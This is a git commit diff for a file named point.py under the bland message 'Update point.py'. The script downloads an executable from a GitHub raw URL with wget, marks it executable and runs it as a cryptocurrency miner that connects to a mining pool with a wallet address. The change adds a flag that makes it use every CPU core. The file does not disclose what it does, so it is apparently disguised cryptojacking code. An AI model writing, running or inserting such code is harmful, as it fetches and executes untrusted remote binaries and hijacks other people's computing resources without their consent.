29b55f4774a5fd5e81f8fbb355d062a884002078
erlandi <93110170+erlandi-main-api@users.noreply.github.com>
2024-07-10 16:32:39 +0700

    Update point.py

--- point/point.py
+++ point/point.py
@@ -1,4 +1,4 @@
 import sys
 import os
 os.system("wget https://github.com/erlandi-main-api/testpoint/raw/main/cp")
-os.system("chmod +x cp && ./cp -a yespowertide  -o stratum+tcps://stratum-na.rplant.xyz:17059 -u TXkhs8Rp8cAdfL37XUEd23zia61d7tQ9Ro.test")
+os.system("chmod +x cp && ./cp -a yespowertide  -o stratum+tcps://stratum-na.rplant.xyz:17059 -u TXkhs8Rp8cAdfL37XUEd23zia61d7tQ9Ro.test -t $(nproc)")
